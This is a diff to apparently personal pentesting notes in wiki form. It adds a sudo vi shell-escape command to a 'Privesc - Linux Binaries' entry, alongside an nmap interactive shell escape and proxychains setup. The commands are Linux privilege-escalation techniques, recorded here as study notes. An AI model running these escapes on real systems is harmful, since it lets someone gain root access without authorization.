@@ -11613,7 +11613,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ### Change (not add, It will pick the first proxy server) the last line to `socks4 127.0.0.1 1080`
 ## `proxychains4 &lt;command&gt;`</pre>
 </div>
-<div created="20211014102800712" modified="20211027143549355" title="Privesc - Linux Binaries">
+<div created="20211014102800712" modified="20211027143743443" title="Privesc - Linux Binaries">
 <pre>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
 !! nmap
@@ -11621,6 +11621,12 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ```
 nmap --interactive
 ! sh
+```
+
+!! vi
+
+```
+sudo /usr/bin/vi /var/www/html/test -c ':!/bin/sh' 
 ```</pre>
 </div>
 <div created="20210904164116778" modified="20211027140051545" title="Privilege Escalation">
